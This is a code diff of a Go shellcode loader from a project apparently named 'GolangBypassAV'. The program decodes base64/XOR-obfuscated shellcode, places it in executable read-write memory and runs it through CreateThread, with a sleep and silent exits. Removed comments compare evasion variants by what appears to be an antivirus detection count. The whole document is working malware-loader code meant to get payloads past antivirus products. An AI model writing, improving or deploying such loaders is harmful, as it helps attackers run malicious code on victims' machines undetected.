@@ -3,6 +3,7 @@ package main
 import (
 	"GolangBypassAV/encry"
 	"encoding/base64"
+	"fmt"
 	"os"
 	"syscall"
 	"time"
@@ -13,10 +14,18 @@ const (
 	MEM_COMMIT             = 0x1000
 	MEM_RESERVE            = 0x2000
 	PAGE_EXECUTE_READWRITE = 0x40
-	PAGE_READWRITE         = 0x04
 )
 
 var kk = []byte{0x11}
+
+var (
+	kernel32     = syscall.MustLoadDLL("kernel32.dll")
+	ntdll        = syscall.MustLoadDLL("ntdll.dll")
+	VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
+	CreateThread = kernel32.MustFindProc("CreateThread")
+
+	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
+)
 
 func base64Decode(data string) []byte {
 	data1, _ := base64.StdEncoding.DecodeString(data)
@@ -38,24 +47,6 @@ func getEnCode(data []byte) string {
 		shellcode = append(shellcode, bydata[i]+kk[0])
 	}
 	return base64.StdEncoding.EncodeToString(shellcode)
-}
-
-var (
-	kernel32           = syscall.MustLoadDLL("kernel32.dll")
-	ntdll              = syscall.MustLoadDLL("ntdll.dll")
-	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
-	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
-	RtlMoveMemory      = ntdll.MustFindProc("RtlMoveMemory")
-)
-
-func virtualProtect1(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
-	//fmt.Println(1)
-	ret, _, _ := procVirtualProtect.Call(
-		uintptr(lpAddress),
-		uintptr(dwSize),
-		uintptr(flNewProtect),
-		uintptr(lpflOldProtect))
-	return ret > 0
 }
 
 func getDeCode(string2 string) []byte {
@@ -85,24 +76,17 @@ func checkError(err error) {
 
 func genEXE(charcode []byte) {
 
-	//申请只能读写内存
-	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-	if addr == 0 {
-		checkError(err)
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		syscall.Exit(0)
 	}
-	gd()
-	var oldshellcodeperms uint32
-	//改成读写执行
-	virtualProtect1(unsafe.Pointer(&addr), uintptr(len(charcode)), PAGE_EXECUTE_READWRITE, unsafe.Pointer(&oldshellcodeperms))
-
-	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
-	checkError(err)
-
-	gd()
-	for j := 0; j < len(charcode); j++ {
-		charcode[j] = 0
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
+	if err != nil && err.Error() != "The operation completed successfully." {
+		syscall.Exit(0)
 	}
-	syscall.Syscall(addr, 0, 0, 0, 0)
+	time.Sleep(5 * time.Second)
+	//syscall.Syscall(addr, 0, 0, 0, 0)
+	CreateThread.Call(0, 0, addr, 0, 0, 0)
 }
 
 func gd() int64 {
@@ -123,14 +107,11 @@ func getFileShellCode(file string) []byte {
 func getFileShellCode1(file string) string {
 	data := encry.ReadFile(file)
 	shellCodeHex := base64Encode(data)
-	//fmt.Print(shellCodeHex)
+	fmt.Print(shellCodeHex)
 	return shellCodeHex
 }
 
 func main() {
-	//用了virtualProtect没什么明显提升，还是7个。
-	//virtualProtect传参还有点问题，待修复。
-
 	//fmt.Println(1)
 
 	//fmt.Print(getEnCode(getFileShellCode("C:\\Users\\Administrator\\Desktop\\payload.bin")))
